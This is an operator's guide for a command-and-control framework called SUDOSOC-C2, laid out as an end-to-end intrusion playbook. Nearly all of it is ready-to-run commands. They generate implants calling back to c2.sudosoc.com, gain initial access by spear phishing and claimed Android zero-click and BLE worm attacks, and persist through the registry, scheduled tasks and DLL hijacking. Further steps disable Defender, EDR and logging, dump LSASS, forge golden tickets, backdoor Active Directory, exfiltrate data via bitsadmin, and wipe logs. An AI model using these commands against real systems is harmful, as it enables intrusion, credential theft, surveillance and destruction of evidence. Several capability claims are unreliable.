# Suggested Hacking Steps
## SUDOSOC-C2 — Complete Attack Lifecycle Guide

```
███████╗██╗   ██╗██████╗  ██████╗ ███████╗ ██████╗  ██████╗     ██████╗██████╗
██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔════╝██╔═══██╗██╔════╝    ██╔════╝╚════██╗
███████╗██║   ██║██║  ██║██║   ██║███████╗██║   ██║██║         ██║      █████╔╝
╚════██║██║   ██║██║  ██║██║   ██║╚════██║██║   ██║██║         ██║     ██╔═══╝
███████║╚██████╔╝██████╔╝╚██████╔╝███████║╚██████╔╝╚██████╗    ╚██████╗███████╗
╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝     ╚═════╝╚══════╝
```

> **From zero knowledge to complete domain domination — every step, every command, every outcome.**
> Author: Seif (@sudosoc) | Version: v2.0.0 | 2026

---

## Attack Lifecycle Overview

```
PHASE 0        PHASE 1       PHASE 2       PHASE 3
Pre-Attack  →  Initial    →  Foothold   →  Discovery
Preparation    Access        Persistence   Enumeration

PHASE 4        PHASE 5       PHASE 6       PHASE 7
Privilege   →  Defense    →  Credential →  Lateral
Escalation     Evasion       Access        Movement

PHASE 8        PHASE 9       PHASE 10      PHASE 11
Active      →  Hardware   →  Collection →  Cover
Directory      Persistence   Exfiltration  Tracks
Domination
```

---

## Phase 0 — Pre-Attack Preparation

### 0.1 — Infrastructure Setup

```bash
# Server setup (Linux VPS)
apt update && apt install ufw -y
ufw allow 8888/tcp  # mTLS
ufw allow 443/tcp   # HTTPS
ufw allow 53/udp    # DNS
ufw allow 47443/tcp # Multiplayer
ufw enable

# Start SUDOSOC-C2 server
./sudosoc-server daemon --lhost 0.0.0.0 --lport 47443

# Create operator profile
./sudosoc-client
sudosoc [server] > multiplayer --lhost 0.0.0.0 --lport 47443
sudosoc [server] > new-operator --name seif --lhost <VPS_IP>
```

### 0.2 — Passive OSINT

```bash
# Subdomain enumeration
subfinder -d targetcompany.com -all | httpx -tech-detect

# Employee enumeration
theHarvester -d targetcompany.com -b all

# SSL Certificate transparency
curl "https://crt.sh/?q=%.targetcompany.com&output=json" | jq '.[].name_value' | sort -u

# Technology fingerprinting
nmap -sV --script=banner target_ips.txt

# Leaked credentials check
# Use dehashed.com, haveibeenpwned API
```

### 0.3 — Payload Preparation

```bash
# Standard stealth implant (Windows + evasion)
sudosoc > generate \
  --mtls c2.sudosoc.com:8888 \
  --https c2.sudosoc.com:443 \
  --dns dns.sudosoc.com \
  --os windows --arch amd64 \
  --skip-symbols --evasion \
  --name "AdobeUpdate" \
  --save /tmp/payloads/

# Beacon mode (stealthier — checks in every 120s)
sudosoc > generate beacon \
  --https c2.sudosoc.com:443 \
  --os windows --skip-symbols --evasion \
  --seconds 120 --jitter 40 \
  --save /tmp/payloads/

# Android Zero-Click payload
sudosoc > android zero-click --generate --auto \
  --c2 c2.sudosoc.com \
  --save /tmp/payloads/

# Save as profile
sudosoc > profiles new --name "corp-stealth" \
  --mtls c2.sudosoc.com \
  --os windows --skip-symbols --evasion \
  --seconds 120 --jitter 40
```

**Payload Selection:**

| Target Environment | Best Payload | C2 Channel |
|-------------------|--------------|------------|
| Corporate LAN | EXE + mTLS | mTLS 8888 |
| Restricted firewall | EXE + HTTPS | HTTPS 443 |
| No internet | SMB pivot | Internal pivot |
| Blocked all TCP/UDP | EXE + DNS | DNS/DoH |
| Android target | Zero-Click HEIF | Delivered via WhatsApp |
| Air-gapped device | Ultrasonic | Ultrasonic mesh |

---

## Phase 1 — Initial Access

### 1.1 — Spear Phishing

```
Priority targets:
  1. IT Helpdesk / Sysadmin  → often has SYSTEM rights already
  2. Finance / HR              → invoice lures, high click rate
  3. Executives               → high privileges, less training
  4. Contractors              → weaker posture, same network
```

```bash
# Start listeners before sending
sudosoc > https --lhost 0.0.0.0 --lport 443
sudosoc > dns --domains dns.sudosoc.com

# Monitor for callback
sudosoc > sessions
# [*] Session d4a2b9c1 opened — CORP\jsmith @ WORKSTATION-01
```

### 1.2 — Android Zero-Click (No User Interaction)

```bash
# Generate exploit for target's Android version
sudosoc > android zero-click --auto --target +1234567890 --channel whatsapp
# Target receives a WhatsApp image
# libheif processes thumbnail automatically — before they see it
# Code execution in media_server context
# Phantom drops to /data/local/tmp/phantom and runs

# [*] Android Session opened — com.android.phone @ TARGET-PHONE
```

### 1.3 — USB Killer (Physical Access)

```bash
# Plug the compromised Android phone into target laptop
# The phone emulates HID keyboard
# Automatically types PowerShell payload in < 10 seconds
# Laptop is compromised before user notices

# Or: USB Ethernet mode → MITM all laptop traffic
```

### 1.4 — BLE Worm (Proximity)

```bash
# If you have one infected device near target environment:
sudosoc (android_session) > android worm start
# Automatically scans BLE devices
# Exploits BlueFrag (Android 8-9) or SweynTooth
# Propagates to all nearby vulnerable phones
# Each new device becomes a propagation node
```

---

## Phase 2 — Establishing Foothold

### 2.1 — Verify Session

```bash
sudosoc (session) > whoami          # current user
sudosoc (session) > getprivs        # privileges available
sudosoc (session) > info            # OS, hostname, domain, PID
sudosoc (session) > ps              # look for: EDR, interesting processes
```

### 2.2 — Persistence (Install 3+ Methods)

```bash
# Method A — Registry Run Key
sudosoc (session) > execute "reg add HKCU\...\Run /v WinUpdate /t REG_SZ /d C:\Users\Public\svc.exe /f"
sudosoc (session) > upload /tmp/payload.exe C:\Users\Public\svc.exe

# Method B — Scheduled Task
sudosoc (session) > execute "schtasks /create /tn MicrosoftEdgeUpdate /tr C:\ProgramData\svc.exe /sc onidle /i 5 /ru SYSTEM /f"

# Method C — WMI Subscription (hardest to find)
sudosoc (session) > execute "powershell -c \"\$F=Set-WmiInstance -Class __EventFilter ...\""

# Method D — DLL Hijack
sudosoc > generate --mtls c2 --os windows --format shared --name version
sudosoc (session) > upload /tmp/version.dll "C:\Program Files\SomeApp\version.dll"

# Migrate to legitimate process
sudosoc (session) > migrate --pid 840  # explorer.exe
```

---

## Phase 3 — Discovery & Enumeration

### 3.1 — Local System

```bash
sudosoc (session) > execute "systeminfo"
sudosoc (session) > execute "whoami /all"
sudosoc (session) > execute "net user /domain"
sudosoc (session) > execute "cmdkey /list"  # stored credentials
sudosoc (session) > execute "type %APPDATA%\...\ConsoleHost_history.txt"  # PS history
```

### 3.2 — Network

```bash
sudosoc (session) > execute "ipconfig /all"
sudosoc (session) > execute "arp -a"
sudosoc (session) > execute "netstat -ano"
sudosoc (session) > execute "nltest /dclist:corp.local"

# Set up SOCKS5 for full network access
sudosoc (session) > socks5 start --port 1080
# proxychains nmap -sV --open 192.168.1.0/24 -p 22,80,443,445,3389,1433 -T4
# proxychains crackmapexec smb 192.168.1.0/24
```

### 3.3 — Active Directory

```bash
sudosoc (session) > execute "net group \"Domain Admins\" /domain"
sudosoc (session) > execute "net group \"Domain Computers\" /domain"

# Find Kerberoastable accounts
sudosoc (session) > execute "powershell Get-ADUser -Filter {ServicePrincipalName -ne '\$null'} ..."

# Find ADCS templates (massive attack surface)
# proxychains certipy find -u user@corp.local -p pass -dc-ip DC_IP

# BloodHound collection
# proxychains bloodhound-python -d corp.local -u user -p pass -c all
```

---

## Phase 4 — Privilege Escalation

### 4.1 — Token Impersonation (SeImpersonatePrivilege)

```bash
sudosoc (session) > getprivs
# SeImpersonatePrivilege → Enabled ← JACKPOT

sudosoc (session) > getsystem
# [*] NT AUTHORITY\SYSTEM

# If getsystem fails:
sudosoc (session) > upload /opt/tools/GodPotato.exe C:\Temp\GP.exe
sudosoc (session) > execute "C:\Temp\GP.exe -cmd \"cmd /c C:\Temp\payload.exe\""
```

### 4.2 — BYOVD (Any Fully Patched System)

```bash
sudosoc (session) > byovd --local-driver /opt/drivers/RTCore64.sys --action full
# Loads signed but vulnerable driver → Ring-0 code execution
# Can disable EDR at kernel level
```

### 4.3 — Kernel Exploit (Android)

```bash
sudosoc (android) > android kernel exploit
# Auto-detects Android version → selects best exploit
# Dirty Pipe (Android 12-13) → 92% success
# Result: root access without Magisk
```

### 4.4 — UAC Bypass

```bash
sudosoc (session) > execute "powershell \$a='HKCU:\Software\Classes\ms-settings\Shell\Open\command'; New-Item -Path \$a -Force; Set-ItemProperty -Path \$a -Name '(Default)' -Value 'C:\Temp\payload.exe'; Set-ItemProperty -Path \$a -Name 'DelegateExecute' -Value ''; Start-Process C:\Windows\System32\computerdefaults.exe"
```

---

## Phase 5 — Defense Evasion

### 5.1 — Disable Windows Defender

```bash
sudosoc (session) > execute "powershell Set-MpPreference -DisableRealtimeMonitoring \$true"
sudosoc (session) > execute "powershell Add-MpPreference -ExclusionPath C:\Temp"
sudosoc (session) > execute "reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
```

### 5.2 — Kill EDR (BYOVD)

```bash
sudosoc (session) > byovd --local-driver /opt/RTCore64.sys --action full
sudosoc (session) > execute "fltMC unload csagent"        # CrowdStrike
sudosoc (session) > execute "fltMC unload SentinelMonitor" # SentinelOne
```

### 5.3 — Disable Logging

```bash
sudosoc (session) > execute "sc stop EventLog"
sudosoc (session) > execute "wevtutil cl Security"
sudosoc (session) > execute "wevtutil cl System"
sudosoc (session) > execute "sc stop Sysmon64 && sc delete Sysmon64"
sudosoc (session) > execute "reg add ... PowerShell ScriptBlockLogging /v EnableScriptBlockLogging /d 0 /f"
```

### 5.4 — Android Anti-Detection

```bash
# Bypass Play Integrity (banking apps now work on compromised device)
sudosoc (android) > android bypass play-integrity --method magisk

# Check if under analysis before doing anything
# (runs automatically at startup)
# If emulator detected → implant goes dormant
```

---

## Phase 6 — Credential Access

### 6.1 — LSASS Dump

```bash
sudosoc (session) > procdump --pid 624
# → lsass.dmp downloaded

# Parse locally:
# pypykatz lsa minidump lsass.dmp
# → NTLM hashes, cleartext passwords (if WDigest), Kerberos tickets
```

### 6.2 — Kerberoasting

```bash
sudosoc (session) > kerberoast
# → hashes for all service accounts

# Crack:
# hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule
```

### 6.3 — ADCS (Domain Admin in 2 Steps)

```bash
# Step 1: Find vulnerable template
# proxychains certipy find -vulnerable -u user@corp.local

# Step 2: Request certificate as Domain Admin
# proxychains certipy req -u user@corp.local -ca CORP-CA \
#   -template VulnerableTemplate -upn administrator@corp.local

# Step 3: Authenticate with certificate
# proxychains certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → TGT for Administrator — no password needed!
```

### 6.4 — Android OAuth Token Theft

```bash
sudosoc (android) > android tokens steal-all
# → Google: Gmail, Drive, Contacts, Location, Photos tokens
# → Facebook: session token
# → Microsoft: Azure, Outlook, Teams tokens
# All valid immediately — no password, no 2FA needed
```

### 6.5 — VPN Traffic Interception (Android)

```bash
sudosoc (android) > android vpn start
# All traffic from every app now captured
# HTTPS decrypted via CA injection
# Credentials appear in /sdcard/DCIM/.sudosoc/traffic.log
```

---

## Phase 7 — Lateral Movement

### 7.1 — Pass-the-Hash

```bash
sudosoc (session) > make-token Administrator 32ed87bdb5fdc5e9cba88547376818d4
sudosoc (session) > execute "net use \\\\192.168.1.10\\admin$"

# Or via CrackMapExec:
# proxychains crackmapexec smb 192.168.1.0/24 -u Administrator -H HASH --exec-method smbexec -x "whoami"
```

### 7.2 — PsExec to DC

```bash
# Generate implant for the DC
sudosoc > generate --mtls c2 --os windows --format shellcode --save /tmp/dc.bin

# Deploy
sudosoc (session) > upload /tmp/dc.bin \\\\192.168.1.5\\admin$\\dc.bin
sudosoc (session) > psexec --target 192.168.1.5 --user Administrator

# [*] Session opened — CORP\Administrator @ DC01
```

### 7.3 — ADIDNS Hijacking (All Network Credentials)

```bash
# Add WPAD record — any user can do this!
# proxychains python3 dnstool.py -u CORP\user -p pass -a add -r wpad -d <attacker_ip> DC_IP
# Start WPAD server → every HTTP request authenticates
# Capture NTLMv2 hashes from ALL domain users browsing the web
# Relay to internal servers for immediate access
```

### 7.4 — IPv6 Takeover (Entire Subnet)

```bash
# Rogue RA → all Windows machines use us as DNS server
# sudo mitm6 -i eth0 -d CORP.LOCAL
# ntlmrelayx.py -t ldaps://DC_IP --add-computer
# Result: all subnet traffic MITMed in 30-90 seconds
```

---

## Phase 8 — Active Directory Domination

### 8.1 — DCSync → All Hashes

```bash
sudosoc (dc_session) > dcsync --domain corp.local --user krbtgt
# → krbtgt NTLM hash = GOLDEN TICKET

sudosoc (dc_session) > dcsync --domain corp.local --all
# → every password in the domain
```

### 8.2 — Golden Ticket (10-Year Access)

```bash
impacket-ticketer \
  -nthash <krbtgt_hash> \
  -domain corp.local \
  -domain-sid S-1-5-21-... \
  -duration 3650 \
  Administrator

export KRB5CCNAME=Administrator.ccache
proxychains impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
# SYSTEM on DC — even after all passwords changed
```

### 8.3 — AdminSDHolder Backdoor

```bash
sudosoc (dc_session) > adminsdholder --domain corp.local --user backdoor_acct
# Every 60 minutes: SDProp gives backdoor_acct Full Control on ALL admin accounts
# Removal attempt → restored in ≤60 minutes
# Permanent backdoor
```

### 8.4 — Shadow Credentials (Survives Password Reset)

```bash
# Add key credential to any account
# Even if password changes → PKINIT auth still works
# sudosoc (session) > shadowcreds --target cn=administrator,dc=corp,dc=local

# Then: certipy auth -pfx admin.pfx → TGT for Administrator
```

### 8.5 — Skeleton Key (Universal Password)

```bash
sudosoc (dc_session) > execute "mimikatz.exe 'privilege::debug' 'misc::skeleton'"
# Now EVERY account accepts password "mimikatz"
# Persists until DC reboot
```

---

## Phase 9 — Hardware-Level Persistence

### 9.1 — UEFI Implant (Survives Everything)

```bash
sudosoc (dc_session) > uefi --install --efi-path /boot/efi
# Written to EFI System Partition as DXE driver
# Executes before Windows loads
# Survives: OS reinstall, format, BitLocker, hard drive change
# Only removed by: physical UEFI chip reflash
```

### 9.2 — SMM Rootkit (Ring -2)

```bash
sudosoc (dc_session) > smm --install
# Injects handler into System Management Mode
# Executes during hardware interrupts (power, timers)
# Invisible to: OS, hypervisor, all security tools
# Survives: everything except firmware reflash
# Re-installs UEFI implant if removed
```

### 9.3 — Android UEFI (Magisk Module + System App)

```bash
sudosoc (android) > android persist magisk
# Module in /data/adb/modules/ → runs at every boot as root
# Looks like "System Performance Optimizer"
# Survives factory reset (as long as Magisk remains)
```

---

## Phase 10 — Collection & Exfiltration

### 10.1 — Find Sensitive Data

```bash
sudosoc (session) > execute "powershell Get-ChildItem -Path C:\Users -Recurse -Include *.xlsx,*.pdf,*.docx | Where-Object {\$_.Name -match 'password|banking|salary|credentials'}"

# Database files
sudosoc (session) > execute "sqlcmd -S localhost -Q \"BACKUP DATABASE [ProdDB] TO DISK='C:\Temp\db.bak'\""

# Email archive
sudosoc (session) > execute "dir /s /b C:\Users\*.pst"
```

### 10.2 — Stage and Exfiltrate

```bash
# Compress with password
sudosoc (session) > execute "7z a -p'S3cur3!' C:\Temp\data.7z C:\Temp\loot\"

# Exfiltrate via C2 (encrypted by default)
sudosoc (session) > download C:\Temp\data.7z /local/loot/

# Or via BITS (blends with Windows Updates)
sudosoc (session) > execute "bitsadmin /transfer job /upload /priority foreground https://c2.sudosoc.com/upload C:\Temp\data.7z"
```

### 10.3 — Android Comprehensive Collection

```bash
# All messaging apps
sudosoc (android) > android collection whatsapp
sudosoc (android) > android collection telegram
sudosoc (android) > android collection signal

# Camera + Microphone
sudosoc (android) > android record --audio --duration 300  # 5 min audio
sudosoc (android) > android record --screen --duration 60  # 1 min screen

# All WiFi passwords
sudosoc (android) > android wifi passwords

# Corporate WiFi found → use as network pivot
sudosoc (android) > android wifi pivot --ssid "CORP_WIFI" --password "P@ssw0rd"
# Now phone is inside corporate network → scan from it
```

---

## Phase 11 — Covering Your Tracks

### 11.1 — Clear All Logs

```bash
sudosoc (session) > execute "for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\""
sudosoc (session) > execute "wevtutil cl Security"
sudosoc (session) > execute "wevtutil cl \"Microsoft-Windows-PowerShell/Operational\""
sudosoc (session) > execute "wevtutil cl \"Microsoft-Windows-TaskScheduler/Operational\""
```

### 11.2 — Remove Artifacts

```bash
sudosoc (session) > execute "del /f /q C:\Temp\*"
sudosoc (session) > execute "del /f /q %TEMP%\*"
sudosoc (session) > execute "del /f /q %APPDATA%\Microsoft\Windows\Recent\*"
sudosoc (session) > execute "del /f /q C:\Windows\Prefetch\*"
sudosoc (session) > execute "del /f /q %APPDATA%\...\PSReadLine\ConsoleHost_history.txt"
```

### 11.3 — Timestomping

```bash
sudosoc (session) > execute "powershell (Get-Item 'C:\evil.exe').LastWriteTime = '01/15/2020 10:30:00'"
# Better: kernel-level timestomp modifies $FILE_NAME (defeats forensics tools)
sudosoc (session) > timestomp --path C:\evil.exe --copy-from C:\Windows\System32\ntdll.dll
```

### 11.4 — Process Migration

```bash
sudosoc (session) > migrate --pid 840  # Move into explorer.exe
# Implant now runs inside legitimate process
# Original payload process can be killed without losing access
```

---

## Complete Attack Scenarios

### Scenario A: Corporate Network Domination

```
DAY 1 — Setup & Recon
  Passive OSINT → identify IT admin john.smith@corp.com
  Generate beacon payload (HTTPS + evasion)

DAY 1 — Initial Access
  Spear phish → "Q3 Invoice.exe" → john.smith clicks
  Session opens: CORP\john.smith @ WORKSTATION-05

DAY 1 — Escalation
  SeImpersonatePrivilege → getsystem → NT AUTHORITY\SYSTEM
  Disable Defender + kill Sysmon
  Install 3 persistence mechanisms

DAY 2 — Credential Access
  LSASS dump → Administrator NTLM hash
  Kerberoast → sqlsvc password cracked
  ADCS ESC1 → certificate for Domain Admin

DAY 2 — Domain Domination
  DCSync on DC → krbtgt hash
  Golden Ticket created (10 years)
  AdminSDHolder backdoor installed

DAY 3 — Persistence
  UEFI implant on DC → survives rebuild
  SMM rootkit → Ring -2 persistence
  Clean all logs

RESULT:
  Full domain ownership
  Persistent access even after incident response
  Zero forensic evidence
```

### Scenario B: Android → Corporate Network

```
DAY 1 — Zero-Click Delivery
  Target employee receives WhatsApp photo
  libheif processes thumbnail → heap overflow
  Phantom installs silently

DAY 1 — Android Reconnaissance  
  VPN interception active → all traffic captured
  WiFi passwords extracted → finds CORP_WIFI
  Connect phone to corporate WiFi as pivot

DAY 1 — Internal Access
  SOCKS5 via phone → scan internal network
  Find vulnerable servers on 192.168.1.0/24
  Deliver Windows implant via SMB

DAY 2 — Windows Escalation
  Windows session from internal server
  BYOVD → kernel access
  DCSync → domain domination

RESULT: Corporate network fully compromised
        Started from a single WhatsApp photo
```

### Scenario C: Air-Gapped Environment

```
Phase 1 — Bridge the Air Gap
  Compromise internet-connected phone near secure room
  Ultrasonic C2: phone ↔ air-gapped laptop in same room
  18-24 kHz inaudible channel → 100 bps

Phase 2 — Secondary Infection
  Laptop infected via ultrasonic shellcode
  Screen channel for exfiltration (camera view of screen)
  Or: USB Killer when someone charges their phone

Phase 3 — Exfiltration
  Classified data → screen brightness modulation
  Camera outside room captures flickering
  25m range, 20 bps, completely undetectable
```

---

## Decision Trees

### "I have a session — what next?"

```
Got session?
    ↓
Check privileges (getprivs)
    ├── SeImpersonatePrivilege → getsystem → SYSTEM
    ├── Already SYSTEM → disable defenses + dump LSASS
    └── Low privileges only?
            ├── Check potato attacks
            ├── Check BYOVD
            ├── Check unquoted service paths
            └── Check kernel version → exploit
```

### "I have SYSTEM — what next?"

```
Have SYSTEM?
    ├── 1. Disable Defender + kill EDR
    ├── 2. Install 3+ persistence methods
    ├── 3. Dump LSASS
    ├── 4. Kerberoast + ADCS check
    ├── 5. SOCKS5 + network scan
    └── 6. Lateral movement to DC
```

### "I have Domain Admin — what next?"

```
Have DA?
    ├── 1. DCSync → ALL hashes + krbtgt
    ├── 2. Create Golden Ticket
    ├── 3. AdminSDHolder backdoor
    ├── 4. Shadow Credentials on DA accounts
    ├── 5. UEFI + SMM on DC
    ├── 6. Exfiltrate target data
    └── 7. Wipe all logs
```

### "Which C2 channel?"

```
Outbound HTTPS allowed?
  YES → HTTPS with malleable profile
  NO → DNS/DoH allowed?
    YES → DNS-over-HTTPS
    NO → Any internet?
      YES → ICMP channel
      NO → Need pivot
        Internal network? → SMB pivot
        Air-gapped? → Ultrasonic mesh
```

### "Android initial access — which vector?"

```
Can send WhatsApp/MMS?
  YES → Zero-Click (HEIF for Android 10-13, MP4 for 9-12)
  NO → Physical access?
    YES → USB Killer OR Magisk module install
    NO → BLE in range?
      YES → BLE Worm (BlueFrag if Android 8-9)
      NO → Need phishing → APK social engineering
```

---

```
═══════════════════════════════════════════════════════════════════
SUDOSOC-C2 — Suggested Hacking Steps
Copyright (C) 2026  sudosoc — Seif
Precision adversary simulation. Zero compromise.

For authorized red team operations only.
Unauthorized use is illegal under applicable law.
═══════════════════════════════════════════════════════════════════
```
